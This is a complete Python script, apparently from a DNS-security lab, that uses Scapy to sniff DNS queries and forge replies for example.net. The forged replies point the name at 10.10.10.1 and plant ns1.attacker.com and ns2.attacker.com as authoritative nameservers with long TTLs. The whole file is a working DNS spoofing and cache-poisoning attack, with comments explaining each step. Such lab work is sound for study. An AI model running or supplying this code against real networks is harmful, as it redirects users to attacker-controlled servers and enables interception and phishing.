#!/usr/bin/python
from scapy.all import *

def spoof_dns(pkt):
	# Check if the packet has a DNS layer and if the query name ('qname') is 'example.net'
	if (DNS in pkt and b'example.net' in pkt[DNS].qd.qname):
		# Swap the source and destination IP address and creates a new IP packet
		IPpkt = IP(dst=pkt[IP].src, src=pkt[IP].dst)

		# Swap the source and destination port number and creates a new UDP packet
		UDPpkt = UDP(dport=pkt[UDP].sport, sport=53)

		# The Answer Section - Creates a DNS Answer section record. In this case, the 'example.net'resolves to '10.10.10.1)
		Anssec = DNSRR(rrname=pkt[DNS].qd.qname, type='A',ttl=303030, rdata='10.10.10.1')
		
		# The Authority Section (modifies the authority server of example.net to be ns1.attacker.com and ns2.attacker.com)
		# Creates a DNS Authority section recore specifying that one of the nameservers for 'example.net'is'ns1.attacker.com'
		ns1 = DNSRR(rrname='example.net', type='NS', ttl=90000, rdata='ns1.attacker.com')
		#specify a second nameserver as 'ns2.attacker.com'
		ns2 = DNSRR(rrname='example.net', type='NS', ttl=90000, rdata='ns2.attacker.com')
		
		# The Addition Section
		add1 = DNSRR(rrname='ns1.attacker.com', type='A', ttl=303030, rdata='10.10.10.1')
		add2 = DNSRR(rrname='ns2.attacker.com', type='A', ttl=303030, rdata='10.10.10.2')

		# Construct the DNS packet with the above-created answer and authority sections
		DNSpkt = DNS(id=pkt[DNS].id, qd=pkt[DNS].qd, aa=1, rd=0, qr=1, qdcount=1, ancount=1, nscount=2, arcount=2, an=Anssec, ns=ns1/ns2, ar=add1/add2)

		# Construct the entire IP packet
		# chains the IP, UDP, and DNS layers together to form a complete packet
		spoofpkt = IPpkt/UDPpkt/DNSpkt
		# Sends the spoofed packet using Scapy's send function
		send(spoofpkt)


# Sniff UDP query packets and invoke spoof_dns().
# Use Scapy's sniff function to capture packets that are UDP and destined for port 53 (DNS). For each packet that matches, the 'spoof_dns'function is called.
pkt = sniff(filter='udp and dst port 53', prn=spoof_dns)

